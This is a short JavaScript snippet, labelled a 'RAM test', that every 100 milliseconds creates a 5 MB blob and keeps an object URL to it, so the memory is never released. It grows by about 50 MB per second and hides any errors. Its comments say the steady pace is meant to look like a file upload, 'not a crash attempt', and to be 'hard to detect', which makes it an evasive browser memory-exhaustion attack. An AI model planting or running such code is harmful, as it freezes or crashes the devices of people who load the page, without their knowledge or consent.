// We store the 'links' to the memory so the Garbage Collector can't delete the data
let memoryVault = [];

function startRamTest() {
    // We use a slow, steady pulse instead of a fast loop.
    // This looks like a 'file upload' to the browser, not a crash attempt.
    setInterval(() => {
        try {
            // 1. Create a 5MB "chunk" of random noise
            const size = 5 * 1024 * 1024; 
            const data = new Uint8Array(size);
            for (let j = 0; j < size; j += 1024) {
                data[j] = Math.random() * 255; // Fill every 1KB to keep it unique
            }

            // 2. Convert that data into a Blob (Binary Large Object)
            const blob = new Blob([data], { type: 'application/octet-stream' });

            // 3. Create a URL for that blob. 
            // This forces Chrome to keep the blob in the "IO" memory layer.
            const url = URL.createObjectURL(blob);
            
            // 4. Save the reference so it never disappears
            memoryVault.push(url);

        } catch (e) {
            // If it hits a hard limit, it stops silently.
        }
    }, 100); // 50MB every second. Steady and hard to detect.
}
